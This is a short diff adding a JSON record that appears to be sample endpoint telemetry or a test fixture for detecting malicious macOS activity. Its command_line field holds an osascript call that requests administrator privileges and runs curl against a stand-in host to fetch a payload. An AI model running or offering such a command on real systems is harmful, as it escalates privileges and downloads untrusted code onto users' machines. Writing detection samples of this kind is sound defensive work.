@@ -1,0 +1,5 @@
+{
+  "command_line": "osascript -e 'do shell script \"curl http://evil/payload\" with administrator privileges'",
+  "host": "mac-01",
+  "image_basename": "osascript"
+}
